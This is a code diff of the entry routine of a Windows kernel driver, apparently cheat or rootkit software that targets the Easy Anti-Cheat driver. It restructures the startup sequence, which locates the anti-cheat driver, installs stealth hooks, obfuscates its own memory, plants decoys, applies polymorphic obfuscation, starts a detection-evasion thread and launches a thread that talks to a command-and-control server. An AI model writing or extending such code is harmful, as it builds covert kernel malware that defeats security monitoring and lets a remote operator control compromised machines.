@@ -7,6 +7,7 @@
 #include "eac.h"
 #include "nn.h"
 #include "c2_comm.h"
+#include "pattern_analysis.hpp"
 
 extern NeuralNetwork* g_neuralNetwork;
 
@@ -546,68 +547,73 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
     PVOID eacDriverBase;
     SIZE_T eacDriverSize;
 
-    
     status = InitializeFunctionPointers();
     if (!NT_SUCCESS(status)) {
-        DbgPrint("Failed to initialize function pointers: %08X\n", status);
+        C2_DBG_PRINT("Failed to initialize function pointers: %08X\n", status);
         return status;
     }
 
     UNREFERENCED_PARAMETER(RegistryPath);
 
-    
+    // Write encoded codes to registry
     ULONG64 encodedCodes = (ULONG64)RDWCode | ((ULONG64)SHACode << 16) | ((ULONG64)FGACode << 32) | ((ULONG64)CR3Code << 48);
     WriteToRegistry(encodedCodes, L"EncodedCodes");
     WriteToRegistry((ULONG64)Securitycode, L"EncodedSecurity");
 
-    
+    // Create neural network
     g_neuralNetwork = NeuralNetwork_Create(10, 20, 5);
     if (!g_neuralNetwork) return STATUS_INSUFFICIENT_RESOURCES;
 
-    
+    // Initialize stability monitor
     NeuralNetwork_InitializeStabilityMonitor(g_neuralNetwork);
 
-    
+    // Get EAC driver information first
     eacDriverBase = GetEACDriverBase();
     eacDriverSize = GetEACDriverSize();
 
-    if (eacDriverBase && eacDriverSize) {
-       
-        NeuralNetwork_MonitorEAC(g_neuralNetwork, eacDriverBase, eacDriverSize);
-        NeuralNetwork_InitializeStealthHooks(g_neuralNetwork);
-        NeuralNetwork_AdaptSelf(g_neuralNetwork, DriverObject->DriverStart, DriverObject->DriverSize);
-
-       
-        NeuralNetwork_ObfuscateMemory(g_neuralNetwork);
-        NeuralNetwork_CreateDecoys(g_neuralNetwork);
-        NeuralNetwork_ReduceMemoryFootprint(g_neuralNetwork);
-
-        
-        NeuralNetwork_OptimizePerformance(g_neuralNetwork);
-
-        
-        HANDLE threadHandle;
-        PsCreateSystemThread(&threadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL,
-            (PKSTART_ROUTINE)NeuralNetwork_EvadeDetection, g_neuralNetwork);
-
-       
-        status = InitializeWskData();
-        if (NT_SUCCESS(status)) {
-           
-            PsCreateSystemThread(&threadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL,
-                (PKSTART_ROUTINE)NeuralNetwork_CommunicateWithC2, g_neuralNetwork);
-        }
-
-        
-        NeuralNetwork_ApplyPolymorphicObfuscation(g_neuralNetwork);
-
-        
-        NeuralNetwork_AdaptTechniques(g_neuralNetwork);
+    if (!eacDriverBase || !eacDriverSize) {
+        C2_DBG_PRINT("Failed to get EAC driver information\n");
+        NeuralNetwork_Destroy(g_neuralNetwork);
+        return STATUS_UNSUCCESSFUL;
     }
 
-    DbgPrint("\nNeural network fully initialized and operational.");
-    DbgPrint("\nMade by guns.lol/trickstrr");
-  
+    // Now initialize pattern analysis with EAC information
+    status = InitializePatternAnalysis();
+    if (!NT_SUCCESS(status)) {
+        C2_DBG_PRINT("Failed to initialize pattern analysis: %08X\n", status);
+        NeuralNetwork_Destroy(g_neuralNetwork);
+        return status;
+    }
+
+    // Initialize monitoring and protection
+    NeuralNetwork_MonitorEAC(g_neuralNetwork, eacDriverBase, eacDriverSize);
+    NeuralNetwork_InitializeStealthHooks(g_neuralNetwork);
+    NeuralNetwork_AdaptSelf(g_neuralNetwork, DriverObject->DriverStart, DriverObject->DriverSize);
+
+    // Apply protection layers
+    NeuralNetwork_ObfuscateMemory(g_neuralNetwork);
+    NeuralNetwork_CreateDecoys(g_neuralNetwork);
+    NeuralNetwork_ReduceMemoryFootprint(g_neuralNetwork);
+    NeuralNetwork_OptimizePerformance(g_neuralNetwork);
+
+    // Start evasion thread
+    HANDLE threadHandle;
+    PsCreateSystemThread(&threadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL,
+        (PKSTART_ROUTINE)NeuralNetwork_EvadeDetection, g_neuralNetwork);
+
+    // Initialize WSK and C2 communication
+    status = InitializeWskData();
+    if (NT_SUCCESS(status)) {
+        PsCreateSystemThread(&threadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL,
+            (PKSTART_ROUTINE)NeuralNetwork_CommunicateWithC2, g_neuralNetwork);
+    }
+
+    // Apply additional protections
+    NeuralNetwork_ApplyPolymorphicObfuscation(g_neuralNetwork);
+    NeuralNetwork_AdaptTechniques(g_neuralNetwork);
+
+    C2_DBG_PRINT("\nNeural network fully initialized and operational.");
+    C2_DBG_PRINT("\nMade by guns.lol/trickstrr");
 
     return IoCreateDriver(NULL, &InitializeDriver);
 }
